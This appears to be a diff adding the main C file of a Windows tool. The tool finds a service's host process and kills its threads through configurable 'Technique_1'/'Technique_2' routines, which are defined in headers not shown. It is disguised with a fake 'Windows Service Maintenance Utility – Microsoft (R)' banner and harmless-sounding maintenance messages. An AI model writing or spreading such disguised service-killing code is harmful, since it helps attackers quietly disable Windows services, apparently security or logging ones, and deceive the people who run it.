@@ -1,0 +1,98 @@
+#include <windows.h>
+#include <stdio.h>
+
+#include "../include/process_info.h"
+
+// Service discovery method configuration
+#define PID_FROM_SCM 1 // Use Service Control Manager for service lookup
+#define PID_FROM_WMI 0 // Use Windows Management Instrumentation for service lookup
+
+
+// Thread analysis method configuration
+#define KILL_WITH_T1 1 // Method 1: TEB-based thread identification
+#define KILL_WITH_T2 0 // Method 2: Module-based thread identification
+
+
+#if defined(PID_FROM_SCM) && PID_FROM_SCM == 1
+#include "../include/pid_SCM.h"
+#endif
+
+#if defined(PID_FROM_WMI) && PID_FROM_WMI == 1
+#include "../include/pid_WMI.h"
+#endif
+
+
+#if defined(KILL_WITH_T1) && KILL_WITH_T1 == 1
+#include "../include/technique_1.h"
+#endif
+
+#if defined(KILL_WITH_T2) && KILL_WITH_T2 == 1
+#include "../include/technique_2.h"
+#endif
+
+void ServiceMaintenance() {
+
+	puts(
+		"\n"
+		"\t========================================\n"
+		"\t  Windows Service Maintenance Utility  \n"
+		"\t  Version 2.1.0 - Microsoft (R)        \n"
+		"\t========================================\n"
+	);
+
+	if (enoughIntegrityLevel() == TRUE) {
+
+		printf("[*] Verifying administrative privileges... OK\n\n");
+
+		if (isPrivilegeOK() == TRUE) {
+
+#if defined(PID_FROM_SCM) && PID_FROM_SCM == 1
+			DWORD dwServicePID = GetPIDFromSCManager();
+#endif
+
+#if defined(PID_FROM_WMI) && PID_FROM_WMI == 1
+			DWORD dwServicePID = GetPIDFromWMI();
+#endif
+
+			if (dwServicePID != 0) {
+
+				printf("[*] Target service host process: %d\n\n", dwServicePID);
+
+#if defined(KILL_WITH_T1) && KILL_WITH_T1 == 1
+				Technique_1(dwServicePID);
+#endif
+
+#if defined(KILL_WITH_T2) && KILL_WITH_T2 == 1
+				Technique_2(dwServicePID);
+#endif
+
+			}
+			else {
+
+				printf("[!] Service not found or not running.\n");
+
+			}
+		}
+		else {
+
+			printf("[!] Insufficient privileges. Run as Administrator.\n");
+
+		}
+
+	}
+	else {
+
+		printf("[!] Elevation required. Please run as Administrator.\n");
+
+	}
+
+	printf("\n[*] Maintenance complete.\n");
+
+}
+
+int main() {
+
+	ServiceMaintenance();
+
+	return 0;
+}
